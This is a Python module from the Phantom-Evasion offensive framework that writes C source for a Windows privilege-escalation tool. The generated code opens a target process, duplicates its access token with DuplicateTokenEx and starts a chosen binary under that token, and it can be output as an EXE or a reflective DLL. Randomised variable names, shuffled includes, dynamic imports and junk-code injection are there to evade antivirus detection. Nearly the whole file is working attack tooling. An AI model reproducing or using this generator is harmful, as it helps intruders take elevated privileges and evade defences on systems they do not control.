
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import sys 
sys.path.append("Modules/payloads/auxiliar")

from usefull import varname_creator
from usefull import JunkInjector
from usefull import WindowsDefend
from usefull import IncludeShuffler
from usefull import WindowsDecoyProc
from usefull import CloseDecoyProc
from usefull import WriteSource

def Privesc_C_DuplicateTokenEx_windows(ModOpt):

    Binpath = ModOpt["Binpath"]
    Pidtarget = ModOpt["TargetPid"]

    Randprochandle = varname_creator()
    Randtokenhandle = varname_creator()
    RandDuphandle = varname_creator()
    Randsi = varname_creator()
    Randpi = varname_creator()

    Ret_code = ""

    IncludeList = ["#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <math.h>\n","#include <time.h>\n"]

    Ret_code += IncludeShuffler(IncludeList)

    if ModOpt["Outformat"] == "exe":

        Ret_code += "int main(int argc,char * argv[]){\n"

    elif ModOpt["Outformat"] == "dll":
        
        if ModOpt["Reflective"] == True:
            
            Ret_code += "#include \"ReflectiveLoader.h\"\n"

        Ret_code += "BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD dwReason,LPVOID lpReserved){\n"
        Ret_code += "BOOL bReturnValue = TRUE;\n"
        Ret_code += "if(dwReason ==  DLL_PROCESS_ATTACH){\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()

        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"
        
    Ret_code += "$:START\n"

    Ret_code += WindowsDefend(ModOpt)

    #Ret_code += WindowsDecoyProc(ModOpt["DecoyProc"])

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()
        ModOpt["AdvapiHandle"] = varname_creator()
        
        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["AdvapiHandle"] + " = GetModuleHandle(\"advapi32.dll\");\n"

    Ret_code += "$:EVA\n"

    Ret_code += "HANDLE " + Randtokenhandle + " = NULL;\n"
    Ret_code += "HANDLE " + RandDuphandle + " = NULL;\n"
    Ret_code += "STARTUPINFOW " + Randsi + ";\n"
    Ret_code += "PROCESS_INFORMATION " + Randpi + ";\n"
    Ret_code += "ZeroMemory(&" + Randsi + ", sizeof(STARTUPINFOW));\n"
    Ret_code += "ZeroMemory(&" + Randpi + ", sizeof(PROCESS_INFORMATION));\n"
    Ret_code += Randsi + ".cb = sizeof(STARTUPINFO);\n"

    if ModOpt["DynImport"] == True:
        NdcOP = varname_creator()
        NdcOPT = varname_creator()
        NdcDTE = varname_creator()
        NdcCPWTW = varname_creator()
        
        Ret_code += "FARPROC " + NdcOP + " = GetProcAddress(" + ModOpt["Ker32Handle"] + ",\"OpenProcess\");\n"
        Ret_code += "FARPROC " + NdcOPT + " = GetProcAddress(" + ModOpt["AdvapiHandle"] + ",\"OpenProcessToken\");\n"
        Ret_code += "FARPROC " + NdcDTE + " = GetProcAddress(" + ModOpt["AdvapiHandle"] + ",\"DuplicateTokenEx\");\n"
        Ret_code += "FARPROC " + NdcCPWTW + " = GetProcAddress(" + ModOpt["AdvapiHandle"] + ",\"CreateProcessWithTokenW\");\n"      
        Ret_code += "HANDLE " + Randprochandle + " = " + NdcOP + "(PROCESS_ALL_ACCESS,TRUE," + Pidtarget + ");\n"
        Ret_code += NdcOPT + "(" + Randprochandle + ", TOKEN_ALL_ACCESS, &" + Randtokenhandle + ");\n"
        Ret_code += NdcDTE + "(" + Randtokenhandle + ", TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &" + RandDuphandle + ");\n"
        Ret_code += NdcCPWTW + "(" + RandDuphandle + ", LOGON_WITH_PROFILE, NULL,\"" + Binpath + "\", 0, NULL, NULL, &" + Randsi + ", &" + Randpi + ");\n"

    else:

        Ret_code += "HANDLE " + Randprochandle + " = OpenProcess(PROCESS_ALL_ACCESS,TRUE," + Pidtarget + ");\n"
        Ret_code += "OpenProcessToken(" + Randprochandle + ", TOKEN_ALL_ACCESS, &" + Randtokenhandle + ");\n"
        Ret_code += "DuplicateTokenEx(" + Randtokenhandle + ", TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &" + RandDuphandle + ");\n"
        Ret_code += "CreateProcessWithTokenW(" + RandDuphandle + ", LOGON_WITH_PROFILE, NULL,L\"" + Binpath + "\", 0, NULL, NULL, &" + Randsi + ", &" + Randpi + ");\n"

    Ret_code += "$:END\n"

    #Ret_code += CloseDecoyProc(ModOpt["DecoyProc"])

    Ret_code = JunkInjector(Ret_code,ModOpt["JI"],ModOpt["JF"],ModOpt["EF"],False)

    if ModOpt["Outformat"] == "exe":

        Ret_code += "return 0;}"

    elif ModOpt["Outformat"] == "dll":
        
        Ret_code += "}\n"
        Ret_code += "return bReturnValue;}\n"

    WriteSource("Source.c",Ret_code)